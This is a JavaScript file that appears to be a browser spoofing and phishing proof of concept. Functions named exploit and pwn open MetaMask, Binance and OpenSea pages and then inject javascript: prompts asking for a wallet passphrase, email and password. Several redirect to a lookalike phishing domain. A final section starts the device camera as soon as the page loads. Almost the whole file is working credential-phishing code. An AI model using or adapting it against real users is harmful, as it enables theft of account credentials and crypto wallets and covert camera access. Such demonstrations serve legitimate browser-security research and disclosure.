
var spoof = function(){
    document.write("<h1>This is not Google, content are in attacker controll</h1>");
    document.location = "https://google.com:1234";
    setInterval(function(){document.location="https://youtube.com";},9800);
};

function windowOpen() {

    window.open("https://opensea.io/", "_blank");
    
    }

    function windowOpenSelf() {
        window.open("https://opensea.io/", "_self");
    }


function exploit() {

    window.open("https://www.metamask.io", "_blank");
    
    document.getElementById("nop").src = 'javascript:prompt("In order to access metamask.io\\nyou must enter your wallet phasphrase login on your\\nMetaMask Wallet.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
    document.location="http://www.manage-myaccount.paypal.com-webappnftlogin.metamask.io";
    
    }

    function exploitSelf() {

        window.open("https://www.metamask.io", "_self");
        
        document.getElementById("nop").src = 'javascript:prompt("In order to access metamask.io\\nyou must enter your wallet phasphrase login on your\\nMetaMask Wallet.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
        document.location="http://www.manage-myaccount.paypal.com-webappnftlogin.metamask.io";
        
        }
        
        function exploitParent() {

            window.open("https://www.metamask.io", "_parent");
            
            document.getElementById("nop").src = 'javascript:prompt("In order to access metamask.io\\nyou must enter your wallet phasphrase login on your\\nMetaMask Wallet.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
            document.location="http://www.manage-myaccount.paypal.com-webappnftlogin.metamask.io";
            
            }

            function exploitTop() {

                window.open("https://www.metamask.io", "_top");
                
                document.getElementById("nop").src = 'javascript:prompt("In order to access metamask.io\\nyou must enter your wallet phasphrase login on your\\nMetaMask Wallet.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
                document.location="http://www.manage-myaccount.paypal.com-webappnftlogin.metamask.io";
                
                }

    function pwn() {
        win = window.open('https://binance.com:80', '_parent')
        setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access binance.com,Please enter your username and password", "Username / Password");';`, 1500);
    }

    function exploitWithValidUrl() {

        window.open("https://www.metamask.io");
        
        document.getElementById("nop").src = 'javascript:prompt("In order to access metamask.io\\nyou must enter your wallet phasphrase login on your\\nMetaMask Wallet.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
        document.location="https://google.com";
        
        }
        
        function pwnWithValidUrl() {
                win = window.open('https://google.com', '_parent')
                setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access binance.com,Please enter your username and password", "Username / Password");';`, 1500);
            }

            // Set constraints for the video stream
var constraints = { video: { facingMode: "user" }, audio: false };
var track = null;

// Define constants
const cameraView = document.querySelector("#camera--view"),
    cameraOutput = document.querySelector("#camera--output"),
    cameraSensor = document.querySelector("#camera--sensor"),
    cameraTrigger = document.querySelector("#camera--trigger");

// Access the device camera and stream to cameraView
function cameraStart() {
    navigator.mediaDevices
        .getUserMedia(constraints)
        .then(function(stream) {
            track = stream.getTracks()[0];
            cameraView.srcObject = stream;
        })
        .catch(function(error) {
            console.error("Oops. Something is broken.", error);
        });
}

// Take a picture when cameraTrigger is tapped
cameraTrigger.onclick = function() {
    cameraSensor.width = cameraView.videoWidth;
    cameraSensor.height = cameraView.videoHeight;
    cameraSensor.getContext("2d").drawImage(cameraView, 0, 0);
    cameraOutput.src = cameraSensor.toDataURL("image/webp");
    cameraOutput.classList.add("taken");
    // track.stop();
};

// Start the video stream when the window loads
window.addEventListener("load", cameraStart, false);